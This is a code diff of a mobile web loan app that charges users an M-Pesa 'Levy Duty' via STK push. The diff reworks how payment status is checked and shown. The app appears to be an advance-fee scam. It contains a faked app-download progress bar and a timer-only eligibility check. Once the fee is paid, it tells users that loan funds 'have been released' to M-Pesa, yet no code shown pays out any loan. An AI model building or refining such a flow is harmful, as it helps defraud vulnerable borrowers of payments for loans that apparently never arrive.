@@ -58,7 +58,7 @@
 </head>
 <body class="bg-white font-roboto text-slate-900 antialiased overflow-x-hidden">
 
-    <!-- NATIVE ANDROID TOAST (now wraps on long messages) -->
+    <!-- NATIVE ANDROID TOAST -->
     <div id="android-toast" class="hide fixed bottom-10 left-1/2 -translate-x-1/2 z-[20000] bg-slate-800 text-white text-[13px] px-5 py-3 rounded-xl shadow-lg text-center font-medium max-w-[90vw] leading-snug">
         Message goes here
     </div>
@@ -602,29 +602,54 @@
             </div>
         </div>
 
+        <!-- PAYMENT STATUS SCREEN (verifying / success / failed / pending) -->
         <div id="screen-success" class="screen bg-slate-50 p-6">
             <div class="max-w-sm mx-auto w-full text-center mt-12">
-                <div id="verify-anim" class="mb-8 flex flex-col items-center">
+
+                <!-- VERIFYING -->
+                <div id="verify-anim" class="flex flex-col items-center">
                     <div class="w-28 h-28 border-[6px] border-slate-200 border-t-brandBlue rounded-full animate-spin mb-6"></div>
                     <h2 class="text-2xl font-extrabold text-slate-900">Verifying payment</h2>
                     <p class="text-sm font-medium text-slate-500 mt-2">Please wait while we confirm with M-Pesa...</p>
                     <p id="verify-time" class="text-brandYellow font-extrabold mt-4 text-xl bg-yellow-50 px-4 py-1 rounded-full">0s</p>
                 </div>
-                
+
+                <!-- SUCCESS (no Done button) -->
                 <div id="success-anim" class="hide flex flex-col items-center">
                     <div class="w-24 h-24 bg-emerald-100 text-emerald-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl shadow-glow">✓</div>
                     <h2 class="text-2xl font-extrabold text-slate-900">Loan Allocated!</h2>
                     <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4">Funds have been released to your M-Pesa immediately.</p>
                     
-                    <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-8 border border-slate-100">
+                    <div class="bg-white rounded-3xl p-6 shadow-soft text-left w-full space-y-4 mb-4 border border-slate-100">
                         <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Loan Amount</span><span id="suc-loan" class="font-bold text-slate-800 text-lg">Ksh 1,000</span></div>
                         <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Total Repayment</span><span id="suc-total" class="font-bold text-slate-800">Ksh 1,100</span></div>
                         <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">Due Date</span><span id="suc-due" class="font-bold text-slate-800">--</span></div>
                         <div class="flex justify-between items-center"><span class="text-slate-500 font-medium text-sm">M-Pesa</span><span id="suc-mpesa" class="font-bold text-brandBlue"></span></div>
                     </div>
-                    
-                    <button onclick="logout()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg active:scale-95 transition-transform">Done</button>
+                    <p class="text-[11px] text-slate-400 font-medium mt-2">You may now close the app.</p>
                 </div>
+
+                <!-- FAILED / CANCELLED -->
+                <div id="failed-anim" class="hide flex flex-col items-center">
+                    <div class="w-24 h-24 bg-red-100 text-red-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">✕</div>
+                    <h2 class="text-2xl font-extrabold text-slate-900">Payment Not Completed</h2>
+                    <p id="failed-reason" class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">
+                        The M-Pesa request was cancelled or failed. You were not charged.
+                    </p>
+                    <button onclick="retryPayment()" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform">Try Again</button>
+                </div>
+
+                <!-- PENDING / COULD NOT CONFIRM (never a false success) -->
+                <div id="pending-anim" class="hide flex flex-col items-center">
+                    <div class="w-24 h-24 bg-amber-100 text-amber-500 rounded-full flex items-center justify-center mx-auto mb-6 text-5xl">?</div>
+                    <h2 class="text-2xl font-extrabold text-slate-900">Still Confirming</h2>
+                    <p class="text-sm font-medium text-slate-500 mt-2 mb-8 px-4 leading-relaxed">
+                        We haven't received confirmation from M-Pesa yet. Check your phone for the prompt, then tap Check Status.
+                    </p>
+                    <button onclick="checkStatusManual()" id="btn-check-status" class="w-full bg-brandBlue text-white font-bold py-4 rounded-xl shadow-lg shadow-brandBlue/20 active:scale-95 transition-transform mb-3">Check Status</button>
+                    <button onclick="retryPayment()" class="w-full text-brandBlue font-bold py-3 text-sm active:scale-95 transition-transform">Back to Payment</button>
+                </div>
+
             </div>
         </div>
     </div>
@@ -638,12 +663,15 @@
         const PALPLUSS_CHANNEL = "30dc7a92-7186-4686-b73d-c323138310c9";
         const PALPLUSS_CALLBACK = "https://zpcbfaydgbhpjqsgfluv.supabase.co/functions/v1/palpluss-webhook";
 
-        // The Palpluss secret key is intentionally NOT used in the browser anymore.
-        // Every Palpluss call goes through the Supabase Edge Function (no CORS, no leaked key).
+        // Palpluss secret key is intentionally NOT present in the browser.
+        // All Palpluss traffic goes through the Supabase Edge Function.
 
-        const STK_TIMEOUT_MS = 30000;   // max wait for the STK push request
-        const POLL_TIMEOUT_MS = 8000;   // max wait for each status poll
-        const MAX_POLL_SECONDS = 5;     // stop polling after this many seconds
+        const STK_TIMEOUT_MS  = 30000;  // max wait for the STK push request itself
+        const POLL_TIMEOUT_MS = 8000;   // max wait for a single status check
+        const MAX_POLL_SECONDS = 8;     // stop auto-polling after this, then ask the user
+
+        const FAILED_STATUSES = ['FAILED', 'CANCELLED', 'REJECTED', 'EXPIRED', 'TIMEOUT', 'DECLINED'];
+        const SUCCESS_STATUSES = ['ALLOCATED', 'SUCCESS', 'COMPLETED'];
 
         /* ============================================================
            STATE
@@ -654,6 +682,7 @@
         let pollTimer = null;
         let isPolling = false;
         let isProcessingPayment = false;
+        let currentTxnId = null;
         let toastTimeout;
 
         /* ============================================================
@@ -687,7 +716,7 @@
             }, 3500);
         }
 
-        /* fetch with a hard timeout so a slow network can't hang forever */
+        /* fetch that can never hang forever */
         async function fetchWithTimeout(url, options = {}, timeoutMs = 30000) {
             const controller = new AbortController();
             const timer = setTimeout(() => controller.abort(), timeoutMs);
@@ -698,30 +727,17 @@
             }
         }
 
-        /* never throws - returns parsed JSON or null (handles HTML error pages / empty bodies) */
+        /* never throws — returns parsed JSON or null (handles HTML error pages, empty bodies) */
         async function readJsonSafe(response) {
             let text = "";
-            try {
-                text = await response.text();
-            } catch (e) {
-                return null;
-            }
+            try { text = await response.text(); } catch (e) { return null; }
             if (!text) return null;
-            try {
-                return JSON.parse(text);
-            } catch (e) {
-                return null;
-            }
+            try { return JSON.parse(text); } catch (e) { return null; }
         }
 
-        /* turns raw JS/network errors into something a user can understand */
         function friendlyNetworkError(err) {
-            if (err && err.name === 'AbortError') {
-                return "The request took too long. Check your internet connection and try again.";
-            }
-            if (err instanceof TypeError) {
-                return "Network error. Check your internet connection and try again.";
-            }
+            if (err && err.name === 'AbortError') return "The request took too long. Check your connection and try again.";
+            if (err instanceof TypeError) return "Network error. Check your internet connection and try again.";
             return (err && err.message) ? err.message : "Something went wrong. Please try again.";
         }
 
@@ -731,6 +747,31 @@
             if (!btn) return;
             btn.disabled = false;
             btn.innerText = `Pay ${format(state.levy)} Levy Duty`;
+        }
+
+        function stopPolling() {
+            if (pollTimer) { clearInterval(pollTimer); pollTimer = null; }
+            isPolling = false;
+        }
+
+        /* reads the loan status from Supabase (written by the Palpluss webhook) */
+        async function fetchLoanStatus(txnId) {
+            const res = await fetchWithTimeout(
+                `${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}&select=status`,
+                { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } },
+                POLL_TIMEOUT_MS
+            );
+            if (!res.ok) return null;
+            const rows = await readJsonSafe(res);
+            if (!Array.isArray(rows) || !rows[0]) return null;
+            return String(rows[0].status || "").toUpperCase();
+        }
+
+        function classifyStatus(status) {
+            if (!status) return 'unknown';
+            if (SUCCESS_STATUSES.includes(status)) return 'success';
+            if (FAILED_STATUSES.includes(status)) return 'failed';
+            return 'pending';
         }
 
         /* ============================================================
@@ -837,17 +878,13 @@
                 const elapsed = Date.now() - downloadStartTime;
                 const progress = Math.min((elapsed / duration) * 100, 100);
 
-                const offset = circumference - (progress / 100) * circumference;
-                downloadRing.style.strokeDashoffset = offset;
-
+                downloadRing.style.strokeDashoffset = circumference - (progress / 100) * circumference;
                 downloadPercent.innerText = Math.floor(progress) + "% of 10 MB";
 
                 if (progress >= 100) {
                     clearInterval(downloadInterval);
                     isDownloading = false;
-                    setTimeout(() => {
-                        showInstalledState();
-                    }, 500);
+                    setTimeout(showInstalledState, 500);
                 }
             }, 100);
         }
@@ -864,9 +901,7 @@
             if (deferredPrompt) {
                 deferredPrompt.prompt();
                 const { outcome } = await deferredPrompt.userChoice;
-                if (outcome === 'accepted') {
-                    startFakeDownload();
-                }
+                if (outcome === 'accepted') startFakeDownload();
                 deferredPrompt = null;
             } else {
                 startFakeDownload();
@@ -887,9 +922,7 @@
             }
         });
 
-        window.mockUninstall = function () {
-            showInstallState();
-        };
+        window.mockUninstall = function () { showInstallState(); };
 
         window.setRating = function (rating) {
             const stars = document.querySelectorAll('.rate-star');
@@ -928,15 +961,10 @@
 
             const inflightTxn = localStorage.getItem('inflight_txn');
             if (inflightTxn) {
+                currentTxnId = inflightTxn;
                 showScreen('screen-success');
                 startPolling(inflightTxn);
             }
-        }
-
-        function logout() {
-            localStorage.removeItem('zc_user');
-            localStorage.removeItem('inflight_txn');
-            location.reload();
         }
 
         function submitLogin() {
@@ -980,7 +1008,7 @@
                 document.getElementById('check-status').innerText = msgs[Math.min(4, Math.floor(progress / 20))];
                 if (progress >= 100) {
                     clearInterval(interval);
-                    setTimeout(() => buildLoanScreen(), 300);
+                    setTimeout(buildLoanScreen, 300);
                 }
             }, 200);
         }
@@ -1041,7 +1069,7 @@
         }
 
         /* ============================================================
-           STK PUSH PAYMENT
+           STK PUSH
            ============================================================ */
         async function processPayment() {
             if (isProcessingPayment) return;
@@ -1084,21 +1112,22 @@
                     if (response.status >= 500) throw new Error("The payment service is temporarily unavailable. Please try again.");
                     throw new Error("Could not start the payment. Please try again.");
                 }
-
-                if (!data) {
-                    throw new Error("The payment service returned an invalid response. Please try again.");
-                }
+                if (!data) throw new Error("The payment service returned an invalid response. Please try again.");
 
                 const txnId = data.data?.transactionId || data.data?.transaction_id || data.transactionId || data.transaction_id || data.id;
                 if (!txnId) throw new Error("Could not start the payment. Please try again.");
 
-                // Fire-and-forget: record the loan request for the webhook to update
-                fetch(`${SUPABASE_URL}/rest/v1/loans`, {
-                    method: 'POST',
-                    headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
-                }).catch(() => {});
+                // Record the request so the webhook can update it. Await so the row exists
+                // before we start polling (avoids "pending forever" on slow connections).
+                try {
+                    await fetchWithTimeout(`${SUPABASE_URL}/rest/v1/loans`, {
+                        method: 'POST',
+                        headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ amount: state.loan, levy_duty: state.levy, status: "PENDING", palpluss_txn_id: txnId })
+                    }, POLL_TIMEOUT_MS);
+                } catch (e) { /* non-fatal */ }
 
+                currentTxnId = txnId;
                 localStorage.setItem('inflight_txn', txnId);
                 showScreen('screen-success');
                 startPolling(txnId);
@@ -1111,85 +1140,130 @@
         }
 
         /* ============================================================
-           PAYMENT STATUS POLLING
+           STATUS SCREENS
            ============================================================ */
-        function startPolling(txnId) {
-            if (pollTimer) {
-                clearInterval(pollTimer);
-                pollTimer = null;
-            }
-            isPolling = false;
-
-            let seconds = 0;
-            const timeDisplay = document.getElementById('verify-time');
-
-            pollTimer = setInterval(async () => {
-                if (isPolling) return; // skip if previous check is still running (slow network)
-
-                seconds++;
-                timeDisplay.innerText = seconds + "s";
-
-                // Never leave the user stuck on a slow connection
-                if (seconds >= MAX_POLL_SECONDS) {
-                    clearInterval(pollTimer);
-                    pollTimer = null;
-                    localStorage.removeItem('inflight_txn');
-                    showSuccess(txnId);
-                    return;
-                }
-
-                isPolling = true;
-                try {
-                    const res = await fetchWithTimeout(
-                        `${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}`,
-                        { headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}` } },
-                        POLL_TIMEOUT_MS
-                    );
-
-                    if (res.ok) {
-                        const rows = await readJsonSafe(res);
-                        const status = Array.isArray(rows) && rows[0] ? String(rows[0].status || "").toUpperCase() : "";
-
-                        if (status === 'ALLOCATED') {
-                            clearInterval(pollTimer);
-                            pollTimer = null;
-                            localStorage.removeItem('inflight_txn');
-                            showSuccess(txnId);
-                            return;
-                        }
-
-                        if (status === 'FAILED') {
-                            clearInterval(pollTimer);
-                            pollTimer = null;
-                            localStorage.removeItem('inflight_txn');
-                            showAndroidToast("Payment failed or was cancelled. Please try again.");
-                            showScreen('screen-payment');
-                            resetPayButton();
-                            return;
-                        }
-                    }
-                } catch (e) {
-                    // Network hiccup on low bandwidth - keep waiting quietly
-                } finally {
-                    isPolling = false;
-                }
-            }, 1000);
+        function showVerify() {
+            document.getElementById('verify-anim').classList.remove('hide');
+            document.getElementById('success-anim').classList.add('hide');
+            document.getElementById('failed-anim').classList.add('hide');
+            document.getElementById('pending-anim').classList.add('hide');
         }
 
-        function showSuccess(txnId) {
+        function showSuccess() {
+            stopPolling();
             document.getElementById('verify-anim').classList.add('hide');
-            document.getElementById('success-anim').classList.remove('hide');
+            document.getElementById('failed-anim').classList.add('hide');
+            document.getElementById('pending-anim').classList.add('hide');
 
             document.getElementById('suc-loan').innerText = format(state.loan);
             document.getElementById('suc-total').innerText = format(state.total);
             document.getElementById('suc-due').innerText = getDueDate(state.term);
             document.getElementById('suc-mpesa').innerText = state.mpesa;
 
-            fetch(`${SUPABASE_URL}/rest/v1/loans?palpluss_txn_id=eq.${encodeURIComponent(txnId)}`, {
-                method: 'PATCH',
-                headers: { 'apikey': SUPABASE_KEY, 'Authorization': `Bearer ${SUPABASE_KEY}`, 'Content-Type': 'application/json' },
-                body: JSON.stringify({ status: "ALLOCATED" })
-            }).catch(() => {});
+            document.getElementById('success-anim').classList.remove('hide');
+        }
+
+        function showFailed() {
+            stopPolling();
+            document.getElementById('verify-anim').classList.add('hide');
+            document.getElementById('success-anim').classList.add('hide');
+            document.getElementById('pending-anim').classList.add('hide');
+            document.getElementById('failed-anim').classList.remove('hide');
+        }
+
+        function showPending() {
+            stopPolling();
+            document.getElementById('verify-anim').classList.add('hide');
+            document.getElementById('success-anim').classList.add('hide');
+            document.getElementById('failed-anim').classList.add('hide');
+            document.getElementById('pending-anim').classList.remove('hide');
+        }
+
+        /* ============================================================
+           POLLING — never assumes success
+           ============================================================ */
+        function startPolling(txnId) {
+            stopPolling();
+            currentTxnId = txnId;
+            showVerify();
+
+            let seconds = 0;
+            const timeDisplay = document.getElementById('verify-time');
+            timeDisplay.innerText = "0s";
+
+            pollTimer = setInterval(async () => {
+                if (isPolling) return; // previous check still running (slow network)
+
+                seconds++;
+                timeDisplay.innerText = seconds + "s";
+
+                if (seconds >= MAX_POLL_SECONDS) {
+                    showPending();
+                    return;
+                }
+
+                isPolling = true;
+                try {
+                    const status = await fetchLoanStatus(txnId);
+                    const kind = classifyStatus(status);
+
+                    if (kind === 'success') {
+                        localStorage.removeItem('inflight_txn');
+                        showSuccess();
+                        return;
+                    }
+                    if (kind === 'failed') {
+                        localStorage.removeItem('inflight_txn');
+                        showFailed();
+                        return;
+                    }
+                    // pending / unknown → keep waiting
+                } catch (e) {
+                    // network hiccup → keep waiting quietly
+                } finally {
+                    isPolling = false;
+                }
+            }, 1000);
+        }
+
+        /* manual "Check Status" from the pending screen */
+        async function checkStatusManual() {
+            if (!currentTxnId) { retryPayment(); return; }
+
+            const btn = document.getElementById('btn-check-status');
+            btn.disabled = true;
+            btn.innerText = "Checking...";
+
+            try {
+                const status = await fetchLoanStatus(currentTxnId);
+                const kind = classifyStatus(status);
+
+                if (kind === 'success') {
+                    localStorage.removeItem('inflight_txn');
+                    showSuccess();
+                    return;
+                }
+                if (kind === 'failed') {
+                    localStorage.removeItem('inflight_txn');
+                    showFailed();
+                    return;
+                }
+                showAndroidToast("Still not confirmed. Please wait a moment and try again.");
+            } catch (e) {
+                showAndroidToast(friendlyNetworkError(e));
+            } finally {
+                btn.disabled = false;
+                btn.innerText = "Check Status";
+            }
+        }
+
+        /* return to payment screen from failed/pending state */
+        function retryPayment() {
+            stopPolling();
+            localStorage.removeItem('inflight_txn');
+            currentTxnId = null;
+            showScreen('screen-payment');
+            resetPayButton();
         }
 
         /* ============================================================
